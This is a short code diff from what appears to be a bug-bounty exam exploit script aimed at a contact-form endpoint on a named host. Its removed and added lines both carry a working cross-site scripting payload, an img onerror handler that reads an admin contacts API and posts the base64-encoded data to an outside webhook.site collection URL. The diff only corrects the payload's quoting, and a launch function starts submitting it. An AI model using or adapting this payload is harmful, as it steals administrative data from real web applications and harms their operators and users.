@@ -6,7 +6,7 @@
         const target = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
         
         // This payload grabs its OWN page content and sends it to you
-        const xssPayload = `<img src=x onerror=\"fetch('/api/admin/contacts').then(r=>r.json()).then(d=>fetch('https://webhook.site/c1a55b0c-1861-47a1-90bc-f341746b4c27',{method:'POST',mode:'no-cors',body:btoa(JSON.stringify(d))}))\">`;
+        const xssPayload = `<img src=x onerror="fetch('/api/admin/contacts').then(r=>r.json()).then(d=>fetch('https://webhook.site/c1a55b0c-1861-47a1-90bc-f341746b4c27',{method:'POST',mode:'no-cors',body:btoa(JSON.stringify(d))}))">`;
 
         async function launch() {
             // 1. Submit the message
